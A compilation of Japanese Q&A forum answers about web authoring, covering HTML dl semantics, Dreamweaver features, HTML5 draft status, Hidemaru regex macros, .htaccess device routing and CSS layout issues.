「【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから The dl element represents an association list consisting of zero or more name-value groups (a description list). Each group must consist of one or more names (dt elements) followed by one or more values (dd elements). Within a single dl element, there should not be more than one dt element for each name. Name-value groups may be terms and definitions, metadata topics and values, questions and answers, or any other groups of name-value data. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.5 Grouping content — HTML5( http://www.w3.org/TR/html5/grouping-content.html … )］より」 となっています。dt/dlは、terma termとdescriptionから、nameとvalleに変更になり、「Name-value groups may be terms and definitions, metadata topics and values, questions and answers, or any other groups of name-value data.」「用語と定義、メタデータトピックと値、質問と回答、もしくはその他の名前と説明」となります。 　HTMLの仕様は、マークアップの仕方を定義するものですが、実際には実際の使われ方に引きずられる部分もあります。HTML3.2は特にそうでしたが、HTML4.01で、それらをふるい落としまして整理されましたが、HTML5では、いくつかの要素が定義変更されています。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから The dl element now represents an association list of name-value groups, and is no longer said to be appropriate for dialogue. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTML5 differences from HTML4( http://www.w3.org/TR/2011/WD-html5-diff-20110525 … )］より 　ただ、本来は <dl> <dt>関東建設祭り2011開催決定！</dt> <dd>2011/8/15　</dd> <dt>住宅構造完成見学会（ご予約受付中です）</dt> <dd>2011/8/8</dd> [HTML5]定義を示すときは<dt><dfn><dfn></dt> <dl> <dt><dfn>関東建設祭り2011開催決定！</dfn></dt> <dd>2011/8/15　</dd> <dt><dfn>住宅構造完成見学会（ご予約受付中です）</dfn></dt> <dd>2011/8/8</dd> 「A dl can be used to define a vocabulary list, like in a dictionary. In the following example, each entry, given by a dt with a dfn, has several dds, showing the various parts of the definition. ( http://www.w3.org/TR/html5/grouping-content.html … )」 あるいは、 <ol> <li><span class="time">2011/8/15</span>関東建設祭り2011開催決定！</li> <li><span class="time">2011/8/8</span>住宅構造完成見学会（ご予約受付中です）</li> [HTML5] <ol> <li><time datetime="2011-08-15">2011/8/15</time>関東建設祭り2011開催決定！</li> <li><time datetime="2011-08-08">2011/8/8</time>住宅構造完成見学会（ご予約受付中です）</li> のほうが適切かもしれません。 　dl要素は、term-description以外にname-valueの組み合わせとして使える。
私も手打ちから入った人間ですが、DWは普通に便利で助かりますよ。 私の場合、コードビューとデザインビューを同時に表示しながら、編集はコードビューに手打ちのみで行います。デザインビューをいじるとソースが乱れるので、視界の端で確認するために（自分が打ち損じをするとすぐにわかる）開いておいて、編集には使いません。 ■デザインビューで一通り確認して、一ヶ所だけ訂正したい部分があるとします。その場合、デザインビューの方でその部分を選択すれば、コードビューの方でも自動的に選択されるので、どんなに長大なソースでも修正箇所を一瞬で探し出すことができます。 ■デザインについて悩んでいる時など（いくつかのパーツがあって、どれを使うか迷っている時、文字や枠を何色にするか迷っている時など）、コードビューで編集すればリアルタイムでデザインビューに反映されるため、いちいちブラウザを使うよりはるかにラクで、全体のイメージを掴みやすく、より比較がしやすいです。複数のブラウザで確認したくなった時も、ショートカットキーを二つ三つ押すだけです。 ■ソースをタグや要素ごとに好きな表示方法（色、フォント、イタリック、ボールド）に設定できるので、ソース全体を見た時に、どこが何タグなのか瞬時に判別できます。 ■要素やタグの頭文字を入力すれば該当する要素をパッと表示してくれて、その中から選択できるようになっていること、開始タグの「>」を打つと同時に閉じタグを勝手に入力してくれるなど、入力の補助機能はとても助かります。これらは、手打ちに慣れた人なら誰しも違和感を覚えると思いますが、ソフトのレスポンスを先読みしながら操作するようになると、キーを叩く回数が圧倒的に減るため、確実に編集が早くなります。 ■CSSを設定する時も、ある設定を外部CSSファイルの方にどんな名前で記述したか忘れてしまっていても、htmlの方にidとかclassとか打ち込めば一覧が出るので非常に便利です。タイプミスやスペルミス、id名のカン違いなどのウッカリミスによってきちんと表示されない。といった事態は確実になくなります。 ■複数のファイルにソースが全く同じ箇所があって、それらを全て修正したい時に、ファイルを選択して検索＆置換をかけることができます。大量のファイルをいちいち開いて直すより正確ではるかに早いです。 ■ファイル名を変更すると、そのファイルを参照しているファイルが一覧で表示されて、それらのファイルのソースを一発で修正することができます。 ■ソースの編集、デザインの確認、複数ブラウザでの表示確認、ファイルのUPDOWN、パーミッションの設定、ファイル名の変更や新規ファイルの作成…これらの操作が全て単一のソフト内で完結できることは非常に助かります。 これらが「便利機能」にあたるのかはわかりませんが、私にとってはDWの持つ機能の中で最も重要な機能です。 ご参考までに。
tdのheight属性は非推奨ですが・・ 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから height = length [CN] 推奨しない。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［11.2.6 表のコマ: TH要素とTD要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　見栄えに関するものは、スタイルシートで設定します。行の高さは、line-heightで指定します。また、念のため、セル内のpaddingや、height(セルの高さ)、vertical-align、font-sizeなども合わせて設定しておくと良いでしょう。
音楽 (BGM)javascriptは下記タグを入れるとできます。 ページを変えるまで鳴り続けます。 <embed src="supposed.mid" autostart="true" loop="true" hidden="true"> 詳しくは参照URLのページが参考になると思います。 参考URL：http://external-file.com/ja/music/javascript_mid …
正確には ・データベース ・テンプレート ・htmlを出力するシステム(cgi) ですね。 もちろん、画像ファイル、CSSファイルなどは別途どこかに必要です。 > ローカルには個々のhtmlファイルはないのですよね？ 質問者さんの仰るローカルの意味がよくわかりませんが、htmlの実ファイルがあるかどうかということでしょうか。 それならば、それはケースバイケースですね。PHPなどのCGIで直接HTMLを出力する場合もあれば、同様にCGIからHTMLファイルを育成する場合もあります。どちらとは一概に言えませんが、前者は管理がとても楽になりますが、運用方法によってはサーバーにとても負荷がかかります。後者は静的HTMLファイルを出力するのでサーバーに負担はかかりませんが、HTMLファイルに書き出すときに毎回時間がかかります。
　HTML5は、(DOM,エラー処理の統一や、新しいAPIを含む)膨大なものです。HTML5のなにを学ぼうとされているのかわかりませんが、現在まだ、勧告に至る状況ではありません。最終草案の段階です。 ★W3C Working Draft 25 May 2011 ( http://www.w3.org/TR/2011/WD-html5-20110525/ ) 　今後、勧告案→勧告となる予定 （HTML4.01が勧告になったのが、1999年12月ですが、いまだに世の中はHTML4.01に完全に対応したサイトは極めてわずかです。） 　ですから、まだ参考書を作る段階でもありません。 　HTML4.01を学ぶ最善の方法が、HTML4.01の仕様書を読み解くことであったように、HTML5でも、一番の参考書は仕様書( http://www.w3.org/TR/2011/WD-html5-20110525/ )と、その議論を追いかけることです。 　その一方で、すでにHTML4.01を身につけている人向けに、 ★HTML5 differences from HTML4 ( http://www.w3.org/TR/2011/WD-html5-diff-20110525/ ) 　が常に新しい案が決まると同時に発行されています。これには邦訳( http://standards.mitsue.co.jp/resources/w3c/TR/h … )も出ています。 　以前に私が回答した「HTML5とブラウザ・SEO、videoについて - HTML - 教えて！goo ( http://oshiete.goo.ne.jp/qa/7026853.html#a6 )」などにも目を通してください。 　私も解説書に関わったことがあるのですが、どうしてもつまみ食いになるし、解釈を間違う場合もでてきます。「一番の参考書は仕様書」ということです。 ★まずHTML4.01・・・それもstrictを完璧に身につけること。(けっしてtransitinalじゃない)が、最善にして最短の方法でしょう。幸に邦訳( http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … )も書籍(いい加減なのが多いが=いい加減なのしかないが)も豊富です。 　書籍に良いのがないのは、「仕様書の存在とそれが読める人は、わざわざ書かなくても仕様書を読めば？？ということ。仕様書の存在を知らなかったり、理解が出来ない人が解説書を書くから・・」 【参考サイト】 HTML Current Status - W3C ( http://www.w3.org/standards/techs/html#w3c_all ) 　現状報告・・ここに最新の勧告、勧告案、草案などの一覧があります。
「インクリメンタルサーチ」で検索してみてください。 検索フォームや検索結果を表示する仕組み、一般的にはJavaScriptでいわゆるAjax（一般的でない方法はActionScript）と、 実際に検索するサーバー側のプログラム、Perl、PHPが多いですが、両方必要です。
画面遷移のないajax通信すればいいんじゃないでしょうか。 URL自体移動しないので、履歴はのこりません。 技術的にはそんなに難しくありませんが、セキュリティ対策はちゃんとしないとダメですね。
仕組み的には比較的簡単なデータベース管理です。掲示板なども基本的に同じです。 　たとえば、 CGI RESCUE - ネットサーフレスキューＷｅｂ裏技 ( http://www.rescue.ne.jp/ ) にある、 簡易データベース 簡易データベース２ カード式データベース などが基本システムになります。 　それに、 ・「検索者」は気にいったデータ(登録者）を見つけた場合、複数個を「トレイ」に入れ、それを一括して、管理者の私に送信することができる。 ・「登録者」と「検索者」は、メールアドレスをＩＤ、かつ任意のパスワードを作成できるようにし、ログイン機能を持たせたい。 　などを付加すれば良いです。 「見た目の理想は、例えば、jimdoが提供するテンプレートは綺麗だと思っており」はまったく別の問題です。 　これは、別途HTMLとCSSを学んで、上記のようなシステムが出力するHTMLを変更し、スタイルシートでデザインすることになります。 　このサイトには、初心者向けの説明も下のほうに書かれていますから、勉強してください。とても歴史のあるサイトで、私がウェブサイトを作り始めた十数年前に利用させていただいていました。
1つの正規表現置換だけで一気にやるのは難しいと思います。秀丸ならマクロを使った方が便利です。 ━ ココから ━━━━━━━━━━━━━━━━━━━━━━━━ $my_num = str(tickcount); replaceallfast "<(title|h1|li)>([^<>]+?)</\\1>", "{"+ $my_num +":{\\1}}\\2{{\\1}:"+ $my_num +"}", regular; replaceallfast "<ul>", "{"+ $my_num +":{ul}}", regular; replaceallfast "</ul>", "{{ul}:"+ $my_num +"}", regular; replaceallfast "<([a-zA-Z2-6]+)[^<>]*?>[^<>]+?</\\1>", "", regular; replaceallfast "</?([a-zA-Z]+)[^<>]*?/?>", "", regular; replaceallfast "\\{"+ $my_num +"\\:\\{", "<", regular; replaceallfast "\\{\\{", "</", regular; replaceallfast "\\}\\:"+ $my_num +"\\}", ">", regular; replaceallfast "\\}\\}", ">", regular; replaceallfast "\\n", "", regular; replaceallfast "</(title|h1|ul|li)>", "</\\1>\\n", regular; replaceallfast "<title>([^<>]+?)</title>\\n", "<html>\\n<head>\\n<title>\\1</title>\\n", regular; replaceallfast "</ul>\\n", "</ul>\\n</body>\\n</html>", regular; ━ ココまで ━━━━━━━━━━━━━━━━━━━━━━━━ ～上記の様なサンプルで置換処理可能です。1回で済まそうとせずに、敢えて何回かに分けて置換処理を行う事で、確実に処理する様な流れにしています。 P.S. 秀丸の正規表現だと、基本的にマッチングに真なりでしか判定出来ないので。例文の様に「○○を除く文字列」という正規表現は非常に難しくなります。もちろん可能は可能ですが、正規表現による置換処理しか出来ない環境でなければ、特に拘らずに柔軟に対応した方が簡単だと思います。
＞サイトにアクセスがあってからカウントダウンタイマーをスタートさせ、終了と共に違うサイトに転送させたい と、 ＞カウントダウンタイマー終了で別アドレスに転送させる じゃ、まるで違う回答になります。 　すくなくとも、 [CJ-Club]-[JavaScript]-カウントダウン ( http://www.cj-c.com/java_s/java15.htm ) の方法は使えません。 ・ユーザーの時計に依存します。トラブルの要因になります。 ・別アドレスに転送されることを拒否している場合無効です。 私が使っている方法 1)sales　というCGIを作成します。 そのファイルが置かれているディレクトリの.htaccessで、実行権限を与えておきます。 2)sales/には次のデータをおいてあります。 　4NCj2cUXT_html/ 推測されないディレクトリ名(もちろんアクセス制限も) 　　　|-- soledout.html 　　　|-- timeout.html 　　　|-- before.html 　bd/BFKDPRT/ 推測されないディレクトリ名(もちろんアクセス制限も) 　　　|-- 120120120.html 　　　|-- 120120201.html 3) たとえば、/sales/120120120.html を呼ばれた場合、そのようなファイルはありませんから、120120120.htmlはPATH_INFOに格納された上で、salesファイル(CGI)が起動します。 4) salesCGIは、PATH_INFOと、サーバーの時間を元に 　　販売期間前なら、残り時間を示すフォームを含むHTML(before.html)を表示します。 　　　ユーザーからは、/sales/120120120.html のようにしか見えません。 　　販売期間中なら、特売HTML(120120.html)を表示します。 　　　ユーザーからは、/sales/120120120.html のようにしか見えません。 　　売り切れたら、売り切れHTML(seleout.html)を表示します。 　　　ユーザーからは、/sales/120120120.html のようにしか見えません。 　　時間がきたら、完売HTML(soledout.html)を表示します。 　　　ユーザーからは、/sales/120120120.html のようにしか見えません。 ★時間の基準はサーバーの時間で行うようにすること ★before.htmlには、refresh時間を書き加えます。これで時間が経過したらページの表示が変わります。 CGI自体は、単純な判別ルーチンと、必要なHTMLを読み込んで最低限の書き換えを行うものですから数十行もあれば書けるでしょう。文字コードとかもないし・・ 　
.htaccessでのUserAgent判定は、ほとんどmod_rewriteを用いたルーティング処理のためだと思うのですが、業務でマルチデバイス対応のコンテンツを作る際に行っている原則は、 ・ホスト名対応はすべてApache側で対応 ・携帯（ガラケー）のキャリア別判定は行わない ということです。 基本的には、PC / スマホ / ガラケーの3種類だけでルーティングを行います。 ガラケーはキャリア（さらに言うと同一キャリア内の搭載ブラウザ）ごとに、対応エンコード・HTML・CSS対応・絵文字などが大きく異なっており、よほど小規模でなければ全コンテンツを別々に作ることは不可能だし、.htaccess程度で対応できる内容は知れています。 現実的には、共通部分を最小公倍数（FOMA）で作成し、phpライブラリでデバイス特性に合わせて変換します。 よって.htaccessのキャリア判定は簡潔単純に。 #1さんの意見とは真逆になりますが、userAgent判定も、ブラウザハックも、JavaScriptも全部駆使しなければ、HTMLとCSSでマルチデバイス対応のコンテンツは作れませんよ。
Webページのコーディングという事で、その方面に限定された話として。 おそらくですが、テキスト形式で見ると<p>で改行されているか<br>で改行されているかの違いです。 ※pはparagraphの略だったはずなので段落ですね。改行と呼ぶと本当は間違い。 デフォルトスタイルでは、<p>～</p>の後には行間が挿入される事がほとんどです。 <br>の場合改行されるものの、行間は挿入されない事がほとんどです。 という違いがありますね。 あるいは、そのHTMLエディタが対応している動作かどうかは判りませんが… <ul><li>要素を編集中に、Enterを押せば</li>を閉じて次の<li>要素を開始するという動作をするかも知れません。 その場合でもshift+Enterの場合にはその位置に<br>の挿入だけの動作だと思います。 HTMLに限らずで言えば、ワード文書の場合でも同じような動作をしますね。 Excelでもセルに入力中にShift+Enterの場合、セル内で改行されますね。 正しい説明かどうか判りませんが、Enterの場合現在の要素の終了(+次の要素の開始)、Shift+Enterの場合改行(改行タグ/改行コード)の挿入という事だと思えます。
検索文字列 <title>(.+?)｜物理講座</title>\n<meta name="keywords" content="○,物理" /> 置換文字列 <title>\1｜物理講座</title>\n<meta name="keywords" content="\1,物理" />
自動に折り返されたときの隙間は、line-heightとフォントの高さの差によるものです。 HTMLは元々、欧文文化圏のものなので、日本語を表示するときは日本語向きに設定しておくと良い。 たとえば、 p{text-indent:1em;line-height:1.4em;margin:0;} とか tdについてもなら p,td{text-indent:1em;line-height:1.4em;margin:0;} とかをスタイルシートに書いておきましょう。
＞チェックしてみましたが、特に問題ありませんでした。 意外です。 　再度、そのページのURLを入力してチェックしてください。ソース入力ではなくサーバーから提供される形でチェック。 　また、そのページを表示させて、ブラウザの「表示」→「ソース表示」で示されるソースを、差しさわりのある部分を伏字にして、お示しください。
どうしても角を丸くしたいなら画像を加工するか、テーブル＋分割画像を利用した方法を使えば旧バージョンでも表示出来ます。 元々IEのバージョンによって利用出来るものと出来ないものがありますが、IE本来の仕様に基づいているはずなので複数バージョンのIEに合わせるならIE全般に通用しない指定はしない方が無難です。
No1,2さんの意見は妥当で正解ですね。私もそう思います。 ＞XHTMLがこれからの主流になると考えられていたので、XHTML+CSS、文字 そもそも、その考え方がおかしい。 ＞しかし今は今後の主流がHTML5.0になるとのこと。 これも、おかしい。 ＞いちから作り直すとしたらXHTMLかHTMLかどちらで作成すべきなのでしょう どちらでも、かまいません。 なぜか？ 今後主流とか、亜流、とかで決めるべき問題ではないからです。プログラム言語で例を示すとわかるかも？ 例えば、Javaが出現した当時は、はやり物好きは、これからはJavaだよなんて、うそぶいていました。 現実、どうです。確かにJavaは、いろんな場面で使われ、基幹システム、銀行、証券会社、Webアプリ、等々、いろんな場面で使用されていますが、世の中のものが７０％、Javaになりましたでしょうか？ 例えばWEBアプリですが、マルチプラットフォームや、業務系アプリなどはJavaで作る傾向があり、そうでない商業サイトは、なんと、なんと、スクリプト言語の PHPがかなりのウェイトを締めます。もちろんC#など.Netを利用した業務アプリや、商用サイトもたくさんあり、廉価版はPHPなんてことになっています。 Javaが主流になっていません。と言うより、目的や、環境によって使用する言語を選択するのであって、これから、これが主流になるから、これにすると言うのは、かなり偏見にみちた、アホがやることです。 「お嬢様は、アホでいらっしゃいますか」 なんて言われますよ。 と言うもの、一見すると、HTML５もXHTMLも名前が違うように見えるが、目指すところは一緒のところが多数あります。 それは、XMLと言う言語の思想が、色濃く反映されているところにあります。これにより、DOMと言うオブジェクト指向のプログラムの素が生かされる事になります。 クライアントサイドスクリプトとの親和性がより、高められる事になり、さらにAjaxのように、サーバーサイドスクリプトなどサーバーとの親和性も高められる事になります。 それぞれ、XML的な思想により、できることが増えてきています。今まではIEのように、特別なブラウザのみ対応だった、ダイナミックなクライアントスクリプトが、標準化されることは、共通化しています。 Flashのように特定のメーカーに頼る事もなくなるわけです。 最初に、それを取り入れたのはIEですね（GUI表現として）。JavaScriptレベルだと、Netscapeが最初だが、動的なオブジェクトを用意したのは、IEが最初。 結局、それがあだになった部分もあり、下位互換性の問題で、素人には奇奇怪怪の動作をしているようです。 そう、 HTMLだけでなく、それを取り巻く、SVGやCSSなどHTMLオブジェクト（DOM）をどう利用できるかが、今後のHTMLの課題。 どちらにも長所があり、短所が在る。何をしたいのかで、切り替えるレベルの物。 ただ、素人レベルなら、HTML４．０１を最初にならい、XHTMLをならい、HTML5を理解すると、HTML5のよさが分かってくる。しかし、欠点も見えてくる。
HTMLの問題ではなくCSSの問題です。 floatを使用すると高さが0になりますから、それを囲っているブロックの高さも０になります。 結論から言えばfloatを指定している部分にoverflowを追加する。 .footerMenu dl { overflow: auto; } でいいと思いますが、（それほど詳しく調べていません。ご自身のHTMLにあわせてください。） もうちょっといろんなブラウザに対応したいとか、原理などを調べたいのであれば、「css clearfix」で検索してみてください。
＞一つ一つのタグの意味が理解できました。 　もともとHTMLは、ある文書をそれを構成する要素(国語的には段落といったほうが良いかも)に分解してマークアップするためのもの(Markup Language)で、それに他の文献や他の文献の特別な場所にリンクできる便利な機能を加えたもの(Hyper--)です。Hyper Text Markup Language。 　具体的には <h1>ここは見出し(heading)</h1> <p>ここは段落(paragraph)</p> <p>ここも段落です。とくにに<strong>重要</strong>なのは・・</p> <blockquote>ここは一塊の引用(long quotation)</blockguote> <p>詳しくは<a href="http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … 4.01 仕様書邦訳</a>を見てください</p> 　というものです。 　このままだとブラウザは、自前のスタイルシートを使って、見出しは太文字で大きく。引用部分は少しインデントさせて表示します。読み上げブラウザでは、見出しは大きな声で、段落の区切りでは一呼吸置いて・・読み上げます。 　HTMLを書くときは、その文書の中でそれがどのような【意味】を持つかを判別してマークアップしていかなければならないということです。そのツールがタグです。 　大事なことは、タグはどのように表示するかではまったくありません。 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 　たとえば次のような使い方は誤りです。 ・行間を開けたいから<p>を使ったり<br>を繰り返す。 ・文字を大きくしたいから<h2>とかを使う ・字下げしたいから<blockgutoe>を使う ・デザインのために<table>を使う ・余白を開けたいから白い画像を置く ・・・ 　そんなことをしたら、コンピューターにはどこが大事なところか、どこが引用なのかがわかりません。読み上げソフトは読めません。・・・ 　詳しくは「14.1 スタイルシートの概説 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　それでは、まずいということになってW3Cが創設され、HTML4.01という仕様が出来ました。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［2.2.1 HTMLの略歴( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLの性質上、プレゼンテーションに関する要素や属性は、次々と他の機構、とりわけスタイルシートに置換えられていく。 また、文書の構造をプレゼンテーションと切り離すことで広汎なプラットフォームや多様なメディアでの文書提供コストを低下でき、文書の改訂も容易になるということが、経験的に知られている。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［2.4.1 構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より そして、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから しかしながら、より強力なプレゼンテーション機構をスタイルシートが提供するため、World Wide Web Consortium は、HTMLのプレゼンテーション関連要素・属性を、段階的に縮小させていくこととする。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［2.3.5 スタイルシート( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より ★次のバージョンのHTML5では、もう十五年たつので予告どおり、見栄えに変わる要素(<center><i><basefont><big><font><strike><tt>は廃止されます。 そのために 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 HTML 4仕様が定める各DTDの詳細については バージョン情報の項を参照のこと。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Conformance: requirements and recommendations (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より ★strictには<center>はありません。 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 　本題のYahoo!オークションの話題とは外れますが、タグの意味を正確に知っておいてください。デザインのためではありません。
DreamWeaverのデザインビューはまだまだ100%正しく表示されるようには出来ていないのであてにしてはいけませんし、合わせる必要もありません。（いつか完璧に表示されるようになれば少しは便利になりますね。） 実際に制作をしている人でデザインビューを確認に使っている人は(ほぼ)いないと思います。 ＞IE,GoogleGhrome,FireFox,Safari,Operaなど、主要ブラウザでの表示も問題ない のであれば何も問題ありませんので、DreamWeaverで編集しつつブラウザ(どれでもいいです)で制作中のページを確認するという方法でOKです。
私は上級者ではないのです。そして、求めていることがよくわからないのです。 スニペット キーボードショートカット では、ダメですかね？ dreamweaverは自分好みにカスタマイズしてなんぼのもんです。お礼のコメントからは求めているのは上記だと思うのですが、どうでしょう？違う気もします。 で、それでもキーボードマクロがいいのだったら、dreamweaverでない、キーボードマクロやマウスジェスチャー、クリップボード支援等ウィンドウズ汎用ソフトを仲介してdreamweaverを扱うのも手です。
.htaccess iphone 振り分け - Google 検索 ( http://www.google.co.jp/#sclient=psy-ab&hl=ja&sa … ) 　の方法で試すしかありません。 　私はfirefox + User Agent Switcher ( https://addons.mozilla.org/ja/firefox/addon/user … ) 　やはりスタイルシートで表示を変えるのが本来の方法です。新しいキャリアが登場するたびに.htaccessを書き直さなきゃならない。本来HTMLは、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 ・・・【中略】・・・ HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　i-phoeや携帯電話、あるいはiPad用にいちいちページを作って、内容が変わるとすべてのページを書き直さなきゃならない。 　スマートフォン独自に適用させるデザインにすれば良いのです。 14.4.1 メディア依存のカスケード ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 7.2 媒体依存型のスタイルシートを指定する ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) iphone スタイルシート @media - Google 検索 ( http://www.google.co.jp/#hl=ja&safe=off&sa=X&ei= … ) 　iphone用のスタイルシートで、flashの部分やＰＣ用のメニューをdisplay:noneとするか、HTML自体で<object-flashe用> 　<object-携帯用> 　　<object テキスト> 　</object> </object> 　とすべきだと思います。 　HTMLさえ、きちんと書かれていたら、そのほうが楽です。 [例] <link href="pc.css" rel="stylesheet" type="text/css" media="screen and (min-device-width: 481px)"> <link href="iphone.css" rel="stylesheet" type= "text/css" media="only screen and (max-device-width: 480px)"> <!--[if IE]> <link href="pc.css" rel="stylesheet" type="text/css" /> <![endif]-->
その例で studyディレクトリの一覧を取って、と考えたのでしょうが、サーバーでそれができるように設定されていなければ無理ですし、そもそも、studyディレクトリ自体が存在しないかもしれません。 ※ サーバーの設定で、CGIのパラメータに変換して処理されている → 実際には abc.com/getpdf.cgi?section=study&lesson=4&name=aoki にアクセスする → getpdf.cgiの中でパラメータを元にデータベースにアクセスして、結果をPDF形式に変換して出力する ということも可能です。実際に似たようなことをしているサイトは沢山あります。 Google等は、他のページやサイトにあるハイパーリンクを辿って情報を収集します。 lesson1_**.pdf等がどこかのページに書かれていれば登録されるかもしれません。 ※ abc.com/study/mokuji.html に一覧表がある、とか。もっとも、これの一覧があるなら「フルネームが分からない」なんてことは無いわけですが。 そうでなければ、存在自体を知る方法がありません。 lessen1_a.pdf ,lessen1_b.pdf ,lessen1_c.pdf ... と総当たりする、というのもありますが、組合せが膨大なために現実的ではありません。連続アクセスで攻撃と見做され、ブロックされるかもしれません。
　Yahoo!のオークションなどでは、スタイルシートが使えないためHTML,TABLEを利用して無理やりデザインを構成しています。あくまで、正規なHTMLやスタイルシートが使えないための裏技だということを理解してください。 □□□□□□□□□■■■■■■■ □□□□□■■■■■■■■■■■ □□□■■■■■■■■■■■■■ □□■■■■■■■■■■■■■■ □□■■■■■■■■■■■■■■ □■■■■■■■■■■■■■■■ □■■■■■■■■■■■■■■■ □■■■■■■■■■■■■■■■ ■■■■■■■■■■■■■■■■ 　と狭い幅の着色したセルを並べています。 　あくまで、オークションサイトなど制限された場所でのみ有効な方法で、一般的なサイトでは禁手です。
時間ないので問題のもの見れていませんが、多分floatの設定が上手くいっていないんだと思います。float レイアウト崩れなどで検索かけて見てください。 ちなみにipadのSafariでは現時点でレイアウト崩れどころかサイト自体表示されません。
ユーザー側のOSがLinuxであろうがWindowsであろうが、Macであろうが関係ありません。 誤解が続いているようですが、HTMLとサーバーとユーザーエージェントは、しっかり役割分担があります。 　Windows側からは利用できるようですが、Windowsで使われているブラウザ、特に古いIEはHTMLが多少間違っていても何とか表示してくれますが、モダンブラウザの多くは比較的厳密です。 　HTMLに動画などを埋め込む要素は、<object>が標準です。<embed>は元々IE独自の要素で、現在は多くのブラウザが対応していますが、標準ではありません。 13.3 一般的包含: OBJECT要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　を使うと、様々なファイルフォーマットを順番にユーザーが利用できます。詳しくは上記リンク先を確認してください。 　Linuxで、どのブラウザを利用されているかわかりませんが、それぞれのブラウザについて調べてください。
No.2ORUKA1951です。DrFellさんの回答を見て、改めて http://homutuku.com/beginner/330.html のサイトを見てみました。 　確かに、初心者が見てはならないページですね(^^) 初心者さんのためのホームページ作成講座--人気ホームページが作れる簡単作成講座 ( http://homutuku.com/beginner/ )から、適当なページを見てみましたが、本当に酷いです。 例) HTMLのDOCUTYEがtransitinalになっていますが、HTML4.01の勧告以来非推奨です。 　「HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 例) 「CSSレイアウトでは、<div>を使ってレイアウトを組みます。 ( http://homutuku.com/beginner/210.html )」 　これは違います。 　「DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　HTMLは、文書構造をマークアップするもので、その文書構造を利用してスタイルシートでデザインするのであって、デザインのためにマークアップするものではありません。 　このように極めて重要なHTMLとCSSの根幹に関わる重大な部分から間違っています。仕様書を一度も読んでいない人が作成しているとしか思えません。それにしても、ここまで酷いのは、見たことありません。 ★先日　kkk01011111さん自信が質問された「ホームページ作成のとき ( http://oshiete.goo.ne.jp/qa/7217379.html )」のHTMLも、デザインによってHTMLを書いていないですね。そうしてあれば、どのようにもデザインできるのです。横だろうが縦だろうが・・ ★まず、デザインはまったく考えずにHTMLを、その文書構造にしたがって記述できるように練習してください。 例) はじめてのWebドキュメントづくり ( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) 　そのうえで、スタイルシートを ★セレクタというもの - CSS講座 ( http://www6.plala.or.jp/go_west/beginner/css/sel … ) あたりで・・ 　くれぐれも、デザインのためにHTMLを書かないように!!!
